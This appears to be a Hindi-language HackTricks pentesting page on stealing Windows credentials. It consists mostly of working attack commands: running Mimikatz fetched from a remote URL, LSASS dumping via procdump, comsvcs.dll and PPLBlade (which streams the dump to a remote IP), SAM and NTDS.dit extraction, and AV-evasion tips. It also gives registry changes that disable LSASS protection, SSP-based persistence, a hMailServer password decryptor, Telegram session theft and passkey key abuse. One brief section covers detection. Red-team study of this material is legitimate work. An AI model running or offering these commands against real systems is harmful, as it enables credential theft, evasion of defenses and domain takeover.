# Windows क्रेडेंशियल्स चुराना

{{#include ../../banners/hacktricks-training.md}}

## क्रेडेंशियल्स Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz के अन्य काम** [**इस पेज पर**](credentials-mimikatz.md)**देखें।**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**यहाँ कुछ संभावित credentials protections के बारे में जानें।**](credentials-protections.md) **ये protections Mimikatz को कुछ credentials निकालने से रोक सकती हैं।**

## Meterpreter में Credentials

पीड़ित के अंदर **passwords और hashes खोजने** के लिए मेरे द्वारा बनाया गया [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) इस्तेमाल करें।

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV को बायपास करना

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) से **Procdump एक वैध Microsoft टूल है**, इसलिए Defender इसे detect नहीं करता।\
आप इस टूल का इस्तेमाल **lsass process का dump लेने**, **dump डाउनलोड करने** और उसमें से **credentials को स्थानीय रूप से extract करने** के लिए कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी इस्तेमाल कर सकते हैं।

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) से स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: कुछ **AV**, **lsass.exe को dump करने के लिए procdump.exe** के उपयोग को **malicious** के रूप में **detect** कर सकते हैं। ऐसा इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** strings को **detect** कर रहे होते हैं। इसलिए, **lsass.exe के नाम** के **बजाय**, procdump को **argument** के रूप में lsass.exe का **PID** देना ज़्यादा **stealthy** है।

### **comsvcs.dll** से lsass को dump करना

`C:\Windows\System32` में मौजूद **comsvcs.dll** नाम की DLL, crash होने पर **process memory dump करने** के लिए ज़िम्मेदार होती है। इस DLL में **`MiniDumpW`** नाम का एक **function** शामिल है, जिसे `rundll32.exe` से चलाने के लिए बनाया गया है।\
पहले दो arguments का उपयोग करना अप्रासंगिक है, लेकिन तीसरा argument तीन हिस्सों में बँटा होता है। Dump किए जाने वाले process का ID पहला हिस्सा होता है, dump file की location दूसरा हिस्सा होती है, और तीसरा हिस्सा केवल **full** शब्द होता है। इसके कोई वैकल्पिक विकल्प नहीं हैं।\
इन तीन हिस्सों को parse करने के बाद, DLL dump file बनाती है और निर्दिष्ट process की memory को इस file में स्थानांतरित करती है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए किया जा सकता है, जिससे procdump को upload और execute करने की ज़रूरत नहीं पड़ती। इस तरीके का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर दिया गया है।<sup>[[9]](#references)</sup>

इस command का उपयोग execution के लिए किया जाता है:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)** से स्वचालित कर सकते हैं।**

### **Task Manager से lsass dump करना**

1. Task Bar पर राइट-क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रक्रिया खोजें
4. "Local Security Authority Process" प्रक्रिया पर राइट-क्लिक करें और "Create dump file" पर क्लिक करें।

### procdump से lsass dump करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा signed binary है और [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite का हिस्सा है।

पहले से मौजूद full-system crash dump या किसी सुलभ user folder में उसकी compressed copy में offline analysis के लिए credential material मौजूद हो सकता है। `MEMORY.DMP` और `MEMORY.7z` जैसे filenames केवल समीक्षा के सुराग हैं: उनके स्रोत और access की पुष्टि करें, और यह न मानें कि उनमें उपयोगी या मौजूदा credentials मौजूद हैं।

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade से lsass डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है, जो memory dump को obfuscate करने और उसे disk पर सेव किए बिना remote workstations पर transfer करने की सुविधा देता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को bypass करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. RAW और SMB upload methods का उपयोग करके memory dump को disk पर सेव किए बिना upload करना (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-आधारित LSASS dumping, MiniDumpWriteDump के बिना

Ink Dragon तीन-चरण वाला dumper इस्तेमाल करता है, जिसका नाम **LalsDumper** है। यह कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर लगे EDR hooks कभी सक्रिय नहीं होते:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 छोटे अक्षर `d` वाले placeholder को खोजता है, उसे `rtu.txt` के absolute path से बदलता है, patched DLL को `nfdp.dll` के रूप में सेव करता है और `AddSecurityPackageA("nfdp","fdp")` कॉल करता है। इससे **LSASS** malicious DLL को नए Security Support Provider (SSP) के रूप में लोड करता है।
2. **LSASS के अंदर Stage 2** – जब LSASS `nfdp.dll` लोड करता है, तो DLL `rtu.txt` पढ़ता है, हर byte को `0x20` के साथ XOR करता है और execution आगे सौंपने से पहले decoded blob को memory में map करता है।
3. **Stage 3 dumper** – mapped payload, hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) से resolved **direct syscalls** का इस्तेमाल करके MiniDump logic को दोबारा लागू करता है। `Tom` नाम का dedicated export `%TEMP%\<pid>.ddt` खोलता है, compressed LSASS dump को file में लिखता है और handle बंद कर देता है, ताकि बाद में exfiltration हो सके।

ऑपरेटर के नोट्स:

* `lals.exe`, `fdp.dll`, `nfdp.dll` और `rtu.txt` को एक ही directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से बदलता है, इसलिए इन्हें अलग-अलग रखने पर chain टूट जाती है।
* Registration, `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में `nfdp` जोड़कर होता है। हर boot पर LSASS से SSP दोबारा load करवाने के लिए आप यह value खुद भी जोड़ सकते हैं।
* `%TEMP%\*.ddt` files compressed dumps होती हैं। इन्हें स्थानीय स्तर पर decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को दें।
* `AddSecurityPackageA` के सफल होने के लिए `lals.exe` को admin/SeTcb rights के साथ चलाना ज़रूरी है; call लौटने के बाद, LSASS rogue SSP को पारदर्शी रूप से load करके Stage 2 चलाता है।
* DLL को disk से हटाने पर वह LSASS से नहीं हटती। Registry entry हटाकर LSASS को restart करें (reboot), या long-term persistence के लिए उसे रहने दें।

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### लक्ष्य DC से NTDS.dit dump करें

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### टार्गेट DC से NTDS.dit password history dump करें

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### प्रत्येक NTDS.dit account के लिए pwdLastSet attribute दिखाएँ

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM और SYSTEM चुराना

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन आप इन्हें **सामान्य तरीके से कॉपी नहीं कर सकते**, क्योंकि ये सुरक्षित हैं।

### Registry से

इन फ़ाइलों को चुराने का सबसे आसान तरीका Registry से उनकी कॉपी प्राप्त करना है:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**डाउनलोड** उन फ़ाइलों को अपनी Kali मशीन पर और **hashes निकालें**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

आप इस service का उपयोग करके protected files की copy बना सकते हैं। इसके लिए आपके पास Administrator अधिकार होने चाहिए।

#### vssadmin का उपयोग

vssadmin binary केवल Windows Server versions में उपलब्ध है.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

लेकिन आप यही काम **Powershell** से भी कर सकते हैं। यह **SAM file कॉपी करने का एक उदाहरण** है (यहाँ इस्तेमाल की गई drive "C:" है और इसे C:\users\Public में save किया गया है), लेकिन आप किसी भी protected file को कॉपी करने के लिए इसका इस्तेमाल कर सकते हैं:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

किताब का कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

अंत में, SAM, SYSTEM और ntds.dit की कॉपी बनाने के लिए [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग भी कर सकते हैं।

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** फ़ाइल को **Active Directory** का केंद्र माना जाता है, जिसमें user objects, groups और उनकी memberships से जुड़ा महत्वपूर्ण डेटा होता है। इसमें domain users के **password hashes** संग्रहित होते हैं। यह फ़ाइल **Extensible Storage Engine (ESE)** database है और **_%SystemRoom%/NTDS/ntds.dit_** पर मौजूद होती है।

इस database में तीन मुख्य tables होती हैं:

- **Data Table**: यह table users और groups जैसे objects का विवरण संग्रहित करती है।
- **Link Table**: यह group memberships जैसे संबंधों का रिकॉर्ड रखती है।
- **SD Table**: हर object के **security descriptors** यहाँ रखे जाते हैं, ताकि संग्रहित objects की security और access control सुनिश्चित हो सके।

Christoffer Andersson का database-layer research इन tables और उनके version-specific व्यवहार का अधिक विस्तार से दस्तावेज़ीकरण करता है।<sup>[[8]](#references)</sup>

Windows इस फ़ाइल से interact करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। इसलिए **NTDS.dit** फ़ाइल का **कुछ हिस्सा `lsass`** memory में मौजूद हो सकता है (संभवतः **cache** के उपयोग से performance बेहतर होने के कारण, इसमें हाल ही में access किया गया डेटा मिल सकता है)।

#### NTDS.dit के अंदर hashes को decrypt करना

Hash को तीन बार encrypt किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके Password Encryption Key (**PEK**) को decrypt करें।
2. **PEK** और **RC4** का उपयोग करके **hash** को decrypt करें।
3. **DES** का उपयोग करके **hash** को decrypt करें।

**PEK** का मान हर domain controller पर **एक जैसा** होता है, लेकिन यह उस domain controller के **SYSTEM** hive से मिले DC-specific **BOOTKEY** के साथ **NTDS.dit** में **encrypted** होता है। इसलिए credentials निकालने के लिए **NTDS.dit** और **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) दोनों की आवश्यकता होती है।

### Ntdsutil का उपयोग करके NTDS.dit कॉपी करना

Windows Server 2008 से उपलब्ध।

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

आप **ntds.dit** file कॉपी करने के लिए [**volume shadow copy**](#stealing-sam-and-system) trick का भी इस्तेमाल कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी भी चाहिए होगी (इसे [**registry से dump करें या volume shadow copy**](#stealing-sam-and-system) trick का इस्तेमाल करें)।

### **NTDS.dit से hashes निकालना**

एक बार जब आप **NTDS.dit** और **SYSTEM** files **प्राप्त** कर लेते हैं, तो hashes **निकालने** के लिए _secretsdump.py_ जैसे tools इस्तेमाल कर सकते हैं:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

आप एक मान्य domain admin user का उपयोग करके उन्हें **स्वचालित रूप से extract** भी कर सकते हैं:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**बड़ी NTDS.dit फ़ाइलों** के लिए, उन्हें [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके extract करने की सलाह दी जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में extract करना**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) से NTDS objects को SQLite database में extract किया जा सकता है। इसमें न केवल secrets extract होते हैं, बल्कि आगे जानकारी निकालने के लिए पूरे objects और उनके attributes भी extract होते हैं, जब raw NTDS.dit फ़ाइल पहले से प्राप्त हो।

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive वैकल्पिक है, लेकिन secrets को decrypt करने की अनुमति देता है (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories)। अन्य जानकारी के साथ, निम्नलिखित डेटा extract किया जाता है: user और machine accounts तथा उनके hashes, UAC flags, last logon और password change के timestamp, accounts के descriptions, names, UPN, SPN, groups और recursive memberships, organizational units का tree और membership, तथा trusted domains के trust type, direction और attributes...

## Lazagne

[binary यहाँ से](https://github.com/AlessandroZ/LaZagne/releases) download करें। कई software से credentials extract करने के लिए आप इस binary का इस्तेमाल कर सकते हैं।

```
lazagne.exe all
```

## SAM और LSASS से credentials निकालने के अन्य tools

### Windows credentials Editor (WCE)

इस tool का उपयोग memory से credentials निकालने के लिए किया जा सकता है। इसे यहां से download करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM फ़ाइल से credentials निकालें

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

इसे यहां से डाउनलोड करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **इसे execute करें**—पासवर्ड निकाल लिए जाएंगे।

## निष्क्रिय RDP sessions का विश्लेषण और security controls को कमजोर करना

Ink Dragon के FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी techniques किसी भी red-teamer के काम आ सकती हैं:<sup>[[3]](#references)</sup>

### DumpRDPHistory-शैली का telemetry collection

* **आउटबाउंड RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर हर user hive को parse करें। हर subkey में server name, `UsernameHint` और last write timestamp होता है। PowerShell से FinalDraft के logic को दोहराया जा सकता है:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP के साक्ष्य** – किसने मशीन का administration किया, यह पता लगाने के लिए `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log में Event IDs **21** (सफल logon) और **25** (disconnect) query करें:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

जब आपको पता चल जाए कि कौन-सा Domain Admin नियमित रूप से कनेक्ट करता है, तो उसका **disconnected** session मौजूद रहते हुए LSASS को dump करें (LalsDumper/Mimikatz से)। CredSSP + NTLM fallback के कारण उसका verifier और tokens LSASS में रह जाते हैं, जिन्हें फिर SMB/WinRM पर replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence स्थापित की जा सकती है।

### FinalDraft द्वारा लक्षित Registry downgrades

वही implant credential theft को आसान बनाने के लिए कई Registry keys के साथ भी छेड़छाड़ करता है:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` सेट करने से RDP के दौरान पूरे credentials/tickets का पुनः उपयोग होता है, जिससे pass-the-hash शैली के pivots संभव होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को निष्क्रिय करता है, जिससे local admins को नेटवर्क पर unrestricted tokens मिलते हैं।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC ऑनलाइन रहने के दौरान log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिलता है।
* `RunAsPPL=0` LSASS PPL protections हटा देता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer configuration credentials (कब्ज़े के बाद)

इंस्टॉलेशन लेआउट के अनुसार सटीक configuration files `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, और `C:\ProgramData\hMailServer\hMailServer.ini` जाँचें। पढ़ने योग्य, गैर-रिक्त `[Security] AdministratorPassword=` value, hMailServer administration password hash है; यह Windows Administrator password का प्रमाण नहीं है। यदि वह credential पुनर्प्राप्त हो जाता है, तो किसी भी Windows-account pivot के लिए password reuse और logon rights की स्वतंत्र रूप से पुष्टि करना आवश्यक है।

SQL CE database इस्तेमाल करने वाले installations में, INI की अलग `[Database] Password=` value database को सुरक्षित रखती है। पुराने installations में यह value static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps का उपयोग करके Blowfish से encrypted होती है। INI में मौजूद hex string को इस Python snippet के साथ इस्तेमाल करें:<sup>[[2]](#references)</sup>

पहले पुष्टि करें कि मौजूदा account INI और उससे संबंधित SQL CE `.sdf` database—दोनों को पढ़ सकता है। INI password database को सुरक्षित रखता है; यह उसके भीतर संग्रहीत mailbox account hashes से अलग है। इस्तेमाल हो रहे database की जाँच या upgrade करने के लिए उसकी **copy** इस्तेमाल करें, live file कभी नहीं।

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

clear-text password के साथ, file locks से बचने के लिए SQL CE database की copy बनाएं, 32-bit provider load करें, और hashes query करने से पहले ज़रूरत पड़ने पर upgrade करें:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` column, hMailServer hash format (hashcat mode `1421`) का उपयोग करता है। Cracked mailbox password, Windows user pivot तभी बनता है जब वही password किसी local/domain account द्वारा reuse किया गया हो और उस account के पास आवश्यक remote-logon rights हों।

## LSA Logon Callback Interception (LsaApLogonUserEx2)

कुछ tooling, LSA logon callback `LsaApLogonUserEx2` को intercept करके **plaintext logon passwords** capture करती है। इसका विचार authentication package callback को hook या wrap करना है, ताकि credentials **logon के दौरान** (hashing से पहले) capture किए जा सकें, फिर उन्हें disk पर लिखा जाए या operator को लौटाया जाए। इसे आमतौर पर ऐसे helper के रूप में लागू किया जाता है जो LSA में inject या उसके साथ register होता है, और फिर प्रत्येक सफल interactive/network logon event का username, domain और password रिकॉर्ड करता है।<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path में helper load करने के लिए local admin/SYSTEM access आवश्यक है।
- Captured credentials तभी दिखाई देते हैं जब कोई logon होता है (hook के आधार पर interactive, RDP, service या network logon)।

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), saved connection information को per-user `sqlstudio.bin` file में store करता है। Dedicated dumpers, file को parse करके saved SQL credentials recover कर सकते हैं। ऐसे shells में जो केवल command output लौटाते हैं, file को अक्सर Base64 में encode करके stdout पर print करके exfiltrate किया जाता है।<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

ऑपरेटर की ओर से, फ़ाइल को फिर से बनाएं और credentials पुनः प्राप्त करने के लिए dumper को स्थानीय रूप से चलाएं:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Telegram Desktop `tdata` सेशन चोरी

Telegram Desktop अपने authorization और account state को **`tdata`** directory में रखता है। कॉपी किए गए सेशन को संगत tooling से लोड करके account password के बिना authenticate किया जा सकता है, जब तक वह authorization वैध हो; अगर local-data encryption enabled है, तो stealer को उसका passcode भी चाहिए। इसके बाद authenticated session से identity data, dialog और membership metadata, messages और डाउनलोड करने योग्य media तक पहुंच मिल सकती है।<sup>[[10]](#references)</sup>

### खोज और अधिग्रहण

इंस्टॉल किए गए और portable दोनों layouts खोजें; Microsoft Store package names अलग-अलग होते हैं, इसलिए `TelegramMessenge` वाली package directories की सूची बनाएं और उनके `LocalCache\Roaming` subtree की जांच करें।<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

यदि सामान्य read विफल हों और process token में `SeBackupPrivilege` **पहले से मौजूद और enabled** हो, तो backup-aware access एक fallback प्रदान करता है; यह privilege प्राप्त नहीं करता और न ही process को elevate करता है। आवश्यक token privileges मौजूद होने पर, `FILE_FLAG_BACKUP_SEMANTICS` के साथ `CreateFileW` backup/restore semantics का अनुरोध कर सकता है और file security checks को bypass कर सकता है, लेकिन यह flag अकेले किसी असंगत sharing lock को bypass नहीं करता।<sup>[[10]](#references)[[11]](#references)</sup>

Live locked files के लिए **Volume Shadow Copy** बनाएँ/पढ़ें; ACL-blocked files के लिए, `robocopy /B` backup mode का उपयोग करता है और file तथा directory ACLs को bypass करता है।<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

एक bandwidth-conscious implant पहले केवल file-path inventory सबमिट कर सकता है, snapshot identifier प्राप्त कर सकता है जिसमें C2 में पहले से stored paths शामिल हों, और फिर केवल missing files अपलोड कर सकता है। इसलिए, recursive `tdata` enumeration के बाद छोटे incremental transfers भी सफल session theft का संकेत हो सकते हैं।<sup>[[10]](#references)</sup>

### Detection और containment

किसी non-Telegram process द्वारा `tdata` तक recursive access को `SeBackupPrivilege` enablement, backup-semantics file opens, VSS activity या `/B` का उपयोग करने वाले child `robocopy.exe` से correlate करें। साथ ही, `%APPDATA%` और `%LOCALAPPDATA%\Packages` की तेज़ी से enumeration के बाद उसी process से होने वाले outbound connections की भी तलाश करें। Compromise के बाद, अपरिचित sessions को terminate करने के लिए **Settings → Devices** (या **Privacy & Security → Active Sessions**) का उपयोग करें; केवल two-step verification enable करने से पहले से चुराया गया authorization revoke नहीं होता।<sup>[[10]](#references)[[13]](#references)</sup>

## Windows पर Chrome से Passkeys / WebAuthn credential theft

यदि **Chrome + Google Password Manager synced passkeys** का उपयोग करने वाले Windows host पर **victim user** के रूप में code execution प्राप्त हो जाए, तो passkeys एक दिलचस्प post-exploitation target बन जाते हैं—**admin/SYSTEM के बिना भी**।<sup>[[4]](#references)</sup>

### दिलचस्प local artifacts

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** में protobuf-encoded **`WebauthnCredentialSpecifics`** रिकॉर्ड संग्रहीत होते हैं। उसी उपयोगकर्ता की प्रक्रिया synced passkeys के लिए **RP ID**, **username**, **credential ID**, और encrypted private-key material की सूची बना सकती है।<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** में स्थानीय device-enrollment state संग्रहीत होती है, जैसे **`wrapped_identity_private_key`** और synced credentials को पुनर्प्राप्त करने के लिए इस्तेमाल किया जाने वाला wrapped secret।<sup>[[4]](#references)</sup>

त्वरित प्रारंभिक जांच:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs का फिर भी local signing oracle के रूप में दुरुपयोग किया जा सकता है

अगर browser, TPM-backed identity key को **`NCRYPT_OPAQUE_KEY_BLOB`** के रूप में export करता है और उस blob को user-accessible state में संग्रहीत करता है, तो malware को raw private key निकालने की ज़रूरत नहीं होती। वह बस उसी **machine** पर blob को फिर से import करके local TPM से attacker-controlled data पर sign करने के लिए कह सकता है:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

